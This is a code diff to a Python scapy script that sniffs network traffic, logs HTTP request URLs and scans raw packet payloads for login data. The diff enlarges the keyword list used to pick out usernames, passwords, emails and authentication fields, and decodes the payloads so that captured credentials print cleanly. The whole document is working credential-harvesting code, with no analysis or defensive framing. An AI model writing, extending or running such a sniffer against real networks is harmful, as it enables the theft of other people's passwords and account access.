@@ -15,8 +15,14 @@ def geturl(packet):
 
 def get_login_info(packet):
     if packet.haslayer(scapy.Raw):
-        load = packet[scapy.Raw].load
-        keywords = ['login', 'LOGIN', 'user', 'pass', 'username', 'password', 'Login']
+        load = packet[scapy.Raw].load.decode(errors='ignore')
+        keywords = [
+            'login', 'LOGIN', 'user', 'username', 'USER', 'USERNAME',
+            'pass', 'password', 'PASS', 'PASSWORD', 'Login', 'User',
+            'Pass', 'Password', 'uname', 'pwd', 'id', 'credential',
+            'credentials', 'email', 'Email', 'EMAIL', 'auth', 'Auth',
+            'AUTH', 'authentication', 'Authentication', 'AUTHENTICATION'
+        ]
         pattern = '|'.join(keywords)
         match = re.search(pattern, load, re.IGNORECASE)
         if match:
@@ -26,7 +32,7 @@ def get_login_info(packet):
 def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
         url = geturl(packet)
-        print("[+] HTTPRequest > " + url)
+        print("[+] HTTPRequest > " + url.decode())
 
         login_info = get_login_info(packet)
         if login_info:
@@ -45,7 +51,6 @@ def main():
         parser.error("[-] Please specify an interface to capture packets. Use the --help flag for more details.")
 
     sniff(options.interface)
-
 
 
 if __name__ == '__main__':
